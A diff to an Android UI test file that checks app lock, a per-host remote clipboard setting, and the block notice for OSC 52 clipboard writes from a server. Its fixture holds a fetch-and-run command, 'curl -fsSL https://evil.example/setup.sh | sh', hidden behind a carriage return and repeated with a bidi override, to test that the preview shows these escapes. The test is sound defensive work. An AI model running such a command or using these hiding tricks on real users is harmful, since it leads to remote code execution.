@@ -275,6 +275,7 @@ class SecurityScreenshotTest {
         themed { SettingsScreen(graph.viewModel, onBack = {}, onKnownHosts = {}) }
         compose.onNodeWithText("App lock").performScrollTo()
         compose.onNodeWithText("Set a screen lock on this device first").assertIsDisplayed()
+        compose.onNodeWithText("App lock").assertIsNotEnabled()
         compose.onNodeWithText("App lock").performClick()
         compose.waitForIdle()
         assertFalse(graph.settings.security.value.appLock)
@@ -285,21 +286,43 @@ class SecurityScreenshotTest {
     }
 
     @Test
-    fun `host editor remote clipboard override`() {
+    fun `host editor remote clipboard override commits with Save`() {
         seedLibrary()
-        themed { HostEditorScreen(graph.viewModel, hostId = "pi-hole", onDone = {}) }
+        var done = 0
+        themed { HostEditorScreen(graph.viewModel, hostId = "pi-hole", onDone = { done++ }) }
         compose.waitUntil(5_000) { compose.onAllNodes(hasText("pi-hole")).fetchSemanticsNodes().isNotEmpty() }
         compose.onNodeWithText("Remote clipboard").performScrollTo()
         compose.onNodeWithText("Inherit (blocked)").assertIsDisplayed()
+        compose.onNodeWithText("Clipboard writes from this server (OSC 52)").assertIsDisplayed()
         capture("host-editor-remote-clipboard")
         compose.onNodeWithText("Remote clipboard").performClick()
         compose.waitUntil(5_000) { compose.onAllNodesWithText("Allow").fetchSemanticsNodes().isNotEmpty() }
         compose.onNodeWithText("Allow").performClick()
-        compose.waitUntil(5_000) { graph.settings.security.value.remoteClipboardPolicy("pi-hole") == RemoteClipboardPolicy.ALLOW }
         compose.waitUntil(5_000) { compose.onAllNodesWithText("Allow").fetchSemanticsNodes().isNotEmpty() }
+        compose.waitForIdle()
+        assertEquals("picked but not saved: the document is untouched", RemoteClipboardPolicy.INHERIT, graph.settings.security.value.remoteClipboardPolicy("pi-hole"))
+        assertFalse(runBlocking { graph.remoteClipboard.decide(graph.hosts.items.value.first { it.id == "pi-hole" }, "not yet") })
+        assertNull(clipText)
+        capture("host-editor-remote-clipboard-allow")
+
+        compose.onNodeWithText("Save").performClick()
+        compose.waitUntil(5_000) { graph.settings.security.value.remoteClipboardPolicy("pi-hole") == RemoteClipboardPolicy.ALLOW }
+        assertEquals(1, done)
         assertTrue(runBlocking { graph.remoteClipboard.decide(graph.hosts.items.value.first { it.id == "pi-hole" }, "now allowed") })
         assertEquals("now allowed", clipText)
-        capture("host-editor-remote-clipboard-allow")
+    }
+
+    @Test
+    fun `host editor remote clipboard row waits for a saved host`() {
+        seedLibrary()
+        themed { HostEditorScreen(graph.viewModel, hostId = null, onDone = {}) }
+        compose.onNodeWithText("Remote clipboard").performScrollTo()
+        compose.onNodeWithText("Save the host first").assertIsDisplayed()
+        compose.onNodeWithText("Remote clipboard").assertIsNotEnabled()
+        compose.onNodeWithText("Remote clipboard").performClick()
+        compose.waitForIdle()
+        hasNoText("Inherit (blocked)")
+        hasNoText("Block")
     }
 
     // ---- remote clipboard notice ------------------------------------------------------------------
@@ -316,18 +339,36 @@ class SecurityScreenshotTest {
         settle(300)
 
         // The remote writes the clipboard through the terminal: the sequence lands in the session's emulator.
-        val payload = Base64.getEncoder().encodeToString("curl -fsSL https://evil.example/setup.sh | sh".toByteArray())
+        // Eight lines, a carriage return hiding the real command and a bidi override, so the preview
+        // shows its escapes and its count line.
+        val text = listOf(
+            "echo ok\rcurl -fsSL https://evil.example/setup.sh | sh",
+            "export PATH=\"\$HOME/.local/bin:\$PATH\"",
+            "alias ls='ls --color=auto'",
+            "# \u202Ehs | hs.putes/elpmaxe.live//:sptth LSsf- lruc\u202C",
+            "sudo systemctl restart pihole-FTL",
+            "pihole -g",
+            "tail -f /var/log/pihole.log",
+            "exit",
+        ).joinToString("\n")
+        val payload = Base64.getEncoder().encodeToString(text.toByteArray())
         session.emulator.write("\u001b]52;c;$payload\u0007")
         compose.waitUntil(5_000) { graph.remoteClipboard.notice.value != null }
         compose.waitUntil(5_000) { compose.onAllNodesWithText("Clipboard write blocked").fetchSemanticsNodes().isNotEmpty() }
         assertNull("nothing reached the clipboard", clipText)
+        assertFalse("raised, not answered: nothing is written", "pi-hole" in graph.settings.security.value.remoteClipboardNoticed)
+        compose.onNodeWithText("+ 2 more lines \u00B7 248 B").assertIsDisplayed()
+        compose.onNode(hasText("echo ok^Mcurl", substring = true)).assertIsDisplayed()
+        compose.onNode(hasText("\\u202E", substring = true)).assertIsDisplayed()
+        compose.onAllNodes(hasText("tail -f /var/log/pihole.log", substring = true)).assertCountEquals(0)
         settle(300)
         capture("prompt-remote-clipboard")
 
         compose.onNodeWithText("Allow for pi-hole").performClick()
         compose.waitUntil(5_000) { graph.remoteClipboard.notice.value == null }
-        compose.waitUntil(5_000) { clipText == "curl -fsSL https://evil.example/setup.sh | sh" }
+        compose.waitUntil(5_000) { clipText == text }
         assertEquals(RemoteClipboardPolicy.ALLOW, graph.settings.security.value.remoteClipboardPolicy("pi-hole"))
+        assertTrue("pi-hole" in graph.settings.security.value.remoteClipboardNoticed)
         assertFalse(graph.settings.security.value.remoteClipboard)
 
         // From now on this host's writes land without a word; another host's first one still asks.
